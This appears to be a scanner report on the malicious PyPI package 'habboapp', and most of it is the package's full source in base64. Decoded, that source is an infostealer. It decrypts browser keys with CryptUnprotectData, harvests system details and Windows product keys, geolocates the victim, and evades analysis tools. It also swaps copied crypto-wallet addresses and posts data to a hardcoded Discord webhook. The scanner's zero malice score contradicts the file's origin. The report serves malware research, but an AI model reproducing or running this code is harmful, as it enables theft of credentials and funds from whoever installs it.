statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/habboapp/0.1.0/habboapp-0.1.0-py3-none-any/habboapp/__init__.py
  contents:
  - name: bc_initial_func.ping_on_running
    score: 0.0
    code: |-
      def ping_on_running(self: str) -> str:
              ping1 = {
                  'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
                  'content': "@everyone"
                  }
              ping2 = {
                  'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
                  'content': "@here"
                  }
              if self.pingonrun == "yes":
                  if self.regex_webhook_dsc in self.discord_webhook:
                      if self.pingtype == "@everyone" or self.pingtype == "everyone":
                          httpx.post(self.discord_webhook, json=ping1)
                  if self.pingtype == "@here" or self.pingtype == "here":
                      if self.regex_webhook_dsc in self.discord_webhook :
                          httpx.post(self.discord_webhook, json=ping2)
    tokens: TARGETED_FILE resume load_const STRING_URL load_const @everyone load_const build_const_key_map store_fast ping1 load_const STRING_URL load_const @here load_const build_const_key_map store_fast ping2 load_fast self load_attr pingonrun load_const yes compare_op == pop_jump_if_false TO_NUMBER load_fast self load_attr STRING_LEN_S_ENT_HIGH load_fast self load_attr discord_webhook contains_op pop_jump_if_false TO_NUMBER load_fast self load_attr pingtype load_const @everyone compare_op == pop_jump_if_true TO_NUMBER load_fast self load_attr pingtype load_const everyone compare_op == pop_jump_if_false TO_NUMBER load_global httpx load_attr post load_fast self load_attr discord_webhook load_fast ping1 kw_names json call pop_top load_fast self load_attr pingtype load_const @here compare_op == pop_jump_if_true TO_NUMBER load_fast self load_attr pingtype load_const here compare_op == pop_jump_if_false TO_NUMBER load_fast self load_attr STRING_LEN_S_ENT_HIGH load_fast self load_attr discord_webhook contains_op pop_jump_if_false TO_NUMBER load_global httpx load_attr post load_fast self load_attr discord_webhook load_fast ping2 kw_names json call pop_top return_const None return_const None return_const None return_const None
    hash: 20d0e36d421cbe0b903022cd4ccbb1055ae5c46e8a936eeb1cb834c58c5f9065
sources:
  .repo_cache/malicious_repos/pypi_malregistry/habboapp/0.1.0/habboapp-0.1.0-py3-none-any/habboapp/__init__.py: aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGpzb24KaW1wb3J0IG50cGF0aAppbXBvcnQgb3MKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQgc3FsaXRlMwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB3aW5yZWcKaW1wb3J0IHppcGZpbGUKaW1wb3J0IGh0dHB4CmltcG9ydCBwc3V0aWwKaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGN0eXBlcwppbXBvcnQgdGltZQppbXBvcnQgcHlwZXJjbGlwCmltcG9ydCB3aW4zMmd1aQppbXBvcnQgd2luMzJjb24KCgpmcm9tIHNxbGl0ZTMgaW1wb3J0IGNvbm5lY3QKZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20gc2h1dGlsIGltcG9ydCBjb3B5Mgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhLCB0aW1lem9uZQpmcm9tIHN5cyBpbXBvcnQgYXJndgpmcm9tIHRlbXBmaWxlIGltcG9ydCBnZXR0ZW1wZGlyLCBta2R0ZW1wCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmZyb20gY3R5cGVzIGltcG9ydCB3aW5kbGwsIHdpbnR5cGVzLCBieXJlZiwgY2RsbCwgU3RydWN0dXJlLCBQT0lOVEVSLCBjX2NoYXIsIGNfYnVmZmVyCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSB3aW4zMmNyeXB0IGltcG9ydCBDcnlwdFVucHJvdGVjdERhdGEKCgpsb2NhbCA9IG9zLmdldGVudignTE9DQUxBUFBEQVRBJykKcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpCnRlbXAgPSBvcy5nZXRlbnYoIlRFTVAiKQoKUGFzc3cgPSBbXTsKCiMgYAojICAgICJ5b3Vyd2ViaG9va3VybCIgPSB5b3VyIGRpc2NvcmQgd2ViaG9vayB1cmwKIyAgICAiYmxhY2tjYXBfaW5qZWN0X3VybCIgPSBteSBqYXZhc2NyaXB0IGluamVjdGlvbiAoaSByZWNvbW1hbmQgdG8gbm90IGNoYW5nZSkKIyAgICAiaGlkZSIgPSB5b3Ugd2FudCB0byBoaWRlIGdyYWJiZXI/ICgneWVzJyBvciAnbm8nKQojICAgICJkYnVna2lsbGVyIiA9IHJlY29tbWFuZCB0byBsZXQgdGhpcwojICAgICJibHByZ2dnIiA9IGRvbid0IHRvdWNoIGF0IHRoaXMKIwojIGAKCgoKX19jb25maWdfXyA9IHsKICAgICd5b3Vyd2ViaG9va3VybCc6ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDQxOTAyOTg4Njg1NDk2MzUwL2VuWW80MEhiLWtsMmVId21hSy1ZdGVndHR4NHNMdHpBbGZSTHdTNW9oaHcxT0Z2Y0tTWkpmNjNKNURja3hBbEVuU2ZmIiwKICAgICdibGFja2NhcF9pbmplY3RfdXJsJzogImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9LU0NIZHNjL0JsYWNrQ2FwLUluamVjdC9tYWluL2luZGV4LmpzIiwKICAgICdoaWRlJzogJyVfaGlkZV9zY3JpcHQlJywKICAgICdwaW5nJzogJyVwaW5nX2VuYWJsZWQlJywKICAgICdwaW5ndHlwZSc6ICclcGluZ190eXBlJScsCiAgICAnZmFrZV9lcnJvcic6JyVfZXJyb3JfZW5hYmxlZCUnLAogICAgJ3N0YXJ0dXAnOiAnJV9zdGFydHVwX2VuYWJsZWQlJywKICAgICdraWxsX2Rpc2NvcmRfcHJvY2Vzcyc6ICcla2lsbF9kaXNjb3JkX3Byb2Nlc3MlJywKICAgICdkYnVna2lsbGVyJzogJyVfZGVidWdraWxsZXIlJywKICAgIAogICAgJ2FkZHJlc3NlX2NyeXB0b19yZXBsYWNlcic6ICclX2FkZHJlc3NfcmVwbGFjZXIlJywKICAgICdhZGRyZXNzZV9idGMnOiAnJV9idGNfYWRkcmVzcyUnLAogICAgJ2FkZHJlc3NlX2V0aCc6ICclX2V0aF9hZGRyZXNzJScsCiAgICAnYWRkcmVzc2VfeGNoYWluJzogJyVfeGNoYWluX2FkZHJlc3MlJywKICAgICdhZGRyZXNzZV9wY2hhaW4nOiAnJV9wY2hhaW5fYWRkcmVzcyUnLAogICAgJ2FkZHJlc3NlX2NjaGFpbic6ICclX2NjaGFpbl9hZGRyZXNzJScsCiAgICAnYWRkcmVzc2VfbW9uZXJvJzogJyVfbW9uZXJvX2FkZHJlc3MlJywKICAgICdhZGRyZXNzZV9hZGEnOiAnJV9hZGFfYWRkcmVzcyUnLAogICAgJ2FkZHJlc3NlX2Rhc2gnOiAnJV9kYXNoX2FkZHJlc3MlJywKICAgICdibHByZ2dnJzoKICAgIFsKICAgICAgICAiaHR0cGRlYnVnZ2VydWkiLAogICAgICAgICJ3aXJlc2hhcmsiLAogICAgICAgICJmaWRkbGVyIiwKICAgICAgICAicmVnZWRpdCIsCiAgICAgICAgImNtZCIsCiAgICAgICAgInRhc2ttZ3IiLAogICAgICAgICJ2Ym94c2VydmljZSIsCiAgICAgICAgImRmNXNlcnYiLAogICAgICAgICJwcm9jZXNzaGFja2VyIiwKICAgICAgICAidmJveHRyYXkiLAogICAgICAgICJ2bXRvb2xzZCIsCiAgICAgICAgInZtd2FyZXRyYXkiLAogICAgICAgICJpZGE2NCIsCiAgICAgICAgIm9sbHlkYmciLAogICAgICAgICJwZXN0dWRpbyIsCiAgICAgICAgInZtd2FyZXVzZXIiLAogICAgICAgICJ2Z2F1dGhzZXJ2aWNlIiwKICAgICAgICAidm1hY3RobHAiLAogICAgICAgICJ4OTZkYmciLAogICAgICAgICJ2bXNydmMiLAogICAgICAgICJ4MzJkYmciLAogICAgICAgICJ2bXVzcnZjIiwKICAgICAgICAicHJsX2NjIiwKICAgICAgICAicHJsX3Rvb2xzIiwKICAgICAgICAieGVuc2VydmljZSIsCiAgICAgICAgInFlbXUtZ2EiLAogICAgICAgICJqb2Vib3hjb250cm9sIiwKICAgICAgICAia3NkdW1wZXJjbGllbnQiLAogICAgICAgICJrc2R1bXBlciIsCiAgICAgICAgImpvZWJveHNlcnZlciIKICAgIF0KCn0KCgoKCmluZm9jb20gPSBvcy5nZXRsb2dpbigpCnZjdG1fcGMgPSBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpCnI0bSA9IHN0cihwc3V0aWwudmlydHVhbF9tZW1vcnkoKVswXSAvIDEwMjQgKiogMykuc3BsaXQoIi4iKVswXQpkMXNrID0gc3RyKHBzdXRpbC5kaXNrX3VzYWdlKCcvJylbMF0gLyAxMDI0ICoqIDMpLnNwbGl0KCIuIilbMF0KCkJsYWNrQ2FwX1JlZ2V4ID0gJ2h0dHBzOi8vcGFzdGUuYmluZ25lci5jb20vcGFzdGUvZmh2eXAvcmF3JwpyZWdfcmVxID0gcmVxdWVzdHMuZ2V0KEJsYWNrQ2FwX1JlZ2V4KSAKY2xlYXJfcmVnID0gciJbXHctXXsyNH1cLiIgKyByZWdfcmVxLnRleHQKCgoKCmNsYXNzIEZ1bmN0aW9ucyhvYmplY3QpOgoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBndG1rM3kocGF0aDogc3RyIG9yIG9zLlBhdGhMaWtlKToKICAgICAgICBpZiBub3QgbnRwYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICB3aXRoIG9wZW4ocGF0aCwgInIiLCBlbmNvZGluZz0idXRmLTgiKSBhcyBmOgogICAgICAgICAgICBjID0gZi5yZWFkKCkKICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMoYykKCiAgICAgICAgdHJ5OgogICAgICAgICAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICAgICAgICAgIHJldHVybiBGdW5jdGlvbnMudzFuZDBfZGNyKG1hc3Rlcl9rZXlbNTpdKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgY252ZXJ0dGltKHRpbWU6IGludCBvciBmbG9hdCkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgZXBvY2ggPSBkYXRldGltZSgxNjAxLCAxLCAxLCB0emluZm89dGltZXpvbmUudXRjKQogICAgICAgICAgICBjb2Rlc3RhbXAgPSBlcG9jaCArIHRpbWVkZWx0YShtaWNyb3NlY29uZHM9dGltZSkKICAgICAgICAgICAgcmV0dXJuIGNvZGVzdGFtcAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHBhc3MKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgdzFuZDBfZGNyKGVuY3J5cHRlZF9zdHI6IGJ5dGVzKSAtPiBzdHI6CiAgICAgICAgcmV0dXJuIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfc3RyLCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBjcjM0dDNfZjFsa2VzKF9kaXI6IHN0ciBvciBvcy5QYXRoTGlrZSA9IGdldHRlbXBkaXIoKSk6CiAgICAgICAgZjFsZW5vbSA9ICcnLmpvaW4ocmFuZG9tLlN5c3RlbVJhbmRvbSgpLmNob2ljZSgnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODknKSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMjApKSkKICAgICAgICBwYXRoID0gbnRwYXRoLmpvaW4oX2RpciwgZjFsZW5vbSkKICAgICAgICBvcGVuKHBhdGgsICJ4IikKICAgICAgICByZXR1cm4gcGF0aAoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBkY3JwdF92YWwoYnVmZiwgbWFzdGVyX2tleSkgLT4gc3RyOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcmV0dXJuIGYnRmFpbGVkIHRvIGRlY3J5cHQgIntzdHIoYnVmZil9IiB8IGtleTogIntzdHIobWFzdGVyX2tleSl9IicKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZzN0X0godG9rZW46IHN0ciA9IE5vbmUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgfQogICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pCiAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgc3lzXzFmbygpIC0+IGxpc3Q6CiAgICAgICAgZmxhZyA9IDB4MDgwMDAwMDAKICAgICAgICBzaDEgPSAid21pYyBjc3Byb2R1Y3QgZ2V0IHV1aWQiCiAgICAgICAgc2gyID0gInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFNvZnR3YXJlUHJvdGVjdGlvblBsYXRmb3JtJyAtTmFtZSBCYWNrdXBQcm9kdWN0S2V5RGVmYXVsdCIKICAgICAgICBzaDMgPSAicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb24nIC1OYW1lIFByb2R1Y3ROYW1lIgogICAgICAgIHRyeToKICAgICAgICAgICAgdXVpZHduZHogPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDEsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkuc3BsaXQoJ1xuJylbMV0uc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHV1aWR3bmR6ID0gIk4vQSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHcxbmszM3kgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDIsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICB3MW5rMzN5ID0gIk4vQSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHcxbnYzciA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KHNoMywgY3JlYXRpb25mbGFncz1mbGFnKS5kZWNvZGUoKS5yc3RyaXAoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHcxbnYzciA9ICJOL0EiCiAgICAgICAgcmV0dXJuIFt1dWlkd25keiwgdzFudjNyLCB3MW5rMzN5XQoKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgbmV0XzFmbygpIC0+IGxpc3Q6CiAgICAgICAgaXAsIGNpdHksIGNvdW50cnksIHJlZ2lvbiwgb3JnLCBsb2MsIGdvb2dsZW1hcCA9ICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIgogICAgICAgIHJlcSA9IGh0dHB4LmdldCgiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIpCiAgICAgICAgaWYgcmVxLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZGF0YSA9IHJlcS5qc29uKCkKICAgICAgICAgICAgaXAgPSBkYXRhLmdldCgnaXAnKQogICAgICAgICAgICBjaXR5ID0gZGF0YS5nZXQoJ2NpdHknKQogICAgICAgICAgICBjb3VudHJ5ID0gZGF0YS5nZXQoJ2NvdW50cnknKQogICAgICAgICAgICByZWdpb24gPSBkYXRhLmdldCgncmVnaW9uJykKICAgICAgICAgICAgb3JnID0gZGF0YS5nZXQoJ29yZycpCiAgICAgICAgICAgIGxvYyA9IGRhdGEuZ2V0KCdsb2MnKQogICAgICAgICAgICBnb29nbGVtYXAgPSAiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3NlYXJjaC9nb29nbGUrbWFwKysiICsgbG9jCiAgICAgICAgcmV0dXJuIFtpcCwgY2l0eSwgY291bnRyeSwgcmVnaW9uLCBvcmcsIGxvYywgZ29vZ2xlbWFwXQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBmZXRjaF9jb25mKGU6IHN0cikgLT4gc3RyIG9yIGJvb2wgfCBOb25lOgogICAgICAgIHJldHVybiBfX2NvbmZpZ19fLmdldChlKQoKCgoKCgoKCgoKY2xhc3MgYXV0b19jb3B5X3dhbGxldChGdW5jdGlvbnMpOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuYWRkcmVzc19zdDNhbGVyID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9jcnlwdG9fcmVwbGFjZXIiKQogICAgICAgIHNlbGYuYWRkcmVzc19idGMgPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2J0YyIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2V0aCA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfZXRoIikKICAgICAgICBzZWxmLmFkZHJlc3NfeGNoYWluID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV94Y2hhaW4iKQogICAgICAgIHNlbGYuYWRkcmVzc19wY2hhaW4gPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX3BjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2NjaGFpbiA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfY2NoYWluIikKICAgICAgICBzZWxmLmFkZHJlc3NfbW9uZXJvID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9tb25lcm8iKQogICAgICAgIHNlbGYuYWRkcmVzc19hZGEgPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2FkYSIpCiAgICAgICAgc2VsZi5hZGRyZXNzX2Rhc2ggPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2Rhc2giKQoKCiAgICBkZWYgYWRkcmVzc19zd2FwKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpcGJvYXJkX2RhdGEgPSBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICBpZiByZS5zZWFyY2goJ15bMTNdW2Eta20tekEtSEotTlAtWjEtOV17MjUsMzR9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19idGMgIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfYnRjKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeMHhbYS1mQS1GMC05XXs0MH0kJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2V0aCkKICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtYXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc194Y2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfeGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtQXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19wY2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfcGNoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeKFtDXXxbYS1rbS16QS1ISi1OUC1aMS05XXszNiw3Mn0pLVthLXpBLVpdezEsODN9MVtxcHpyeTl4OGdmMnR2ZHcwczNqbjU0a2hjZTZtdWE3bF17Mzh9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19jY2hhaW4gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfY2NoYWluKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdhZGRyMVthLXowLTldKycsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2FkYSkKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJy9YWzEtOUEtSEotTlAtWmEta20tel17MzN9JC9nJywgY2xpcGJvYXJkX2RhdGEpOgogICAgICAgICAgICAgICAgaWYgc2VsZi5hZGRyZXNzX2Rhc2ggIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfZGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICBpZiByZS5zZWFyY2goJy80WzAtOUFCXVsxLTlBLUhKLU5QLVphLWttLXpdezkzfSQvZycsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19tb25lcm8gIT0gIm5vbmUiOgogICAgICAgICAgICAgICAgICAgIGlmIGNsaXBib2FyZF9kYXRhIG5vdCBpbiBbc2VsZi5hZGRyZXNzX2J0Yywgc2VsZi5hZGRyZXNzX2V0aCwgc2VsZi5hZGRyZXNzX3hjaGFpbiwgc2VsZi5hZGRyZXNzX3BjaGFpbiwgc2VsZi5hZGRyZXNzX2NjaGFpbiwgc2VsZi5hZGRyZXNzX21vbmVybywgc2VsZi5hZGRyZXNzX2FkYSwgc2VsZi5hZGRyZXNzX2Rhc2hdOgogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAuY29weShzZWxmLmFkZHJlc3NfbW9uZXJvKQogICAgICAgICAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIGRhdGEgPSBOb25lCiAgICAgICAgICAgIAogICAgICAgICAgICAKICAgIGRlZiBsb29wX3Rocm91Z2goc2VsZik6CiAgICAgICAgCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgc2VsZi5hZGRyZXNzX3N3YXAoKQogICAgIAogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBpZiBzZWxmLmFkZHJlc3Nfc3QzYWxlciA9PSAieWVzIjoKICAgICAgICAgICAgc2VsZi5sb29wX3Rocm91Z2goKQoKCmNsYXNzIGJjX2luaXRpYWxfZnVuYyhGdW5jdGlvbnMpOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIAogICAgICAgIHNlbGYuZHNjYXAxID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZSIKCiAgICAgICAgc2VsZi5kaXNjb3JkX3dlYmhvb2sgPSBzZWxmLmZldGNoX2NvbmYoJ3lvdXJ3ZWJob29rdXJsJykKCiAgICAgICAgc2VsZi5oaWRlID0gc2VsZi5mZXRjaF9jb25mKCJoaWRlIikKCiAgICAgICAgc2VsZi5waW5ndHlwZSA9IHNlbGYuZmV0Y2hfY29uZigicGluZ3R5cGU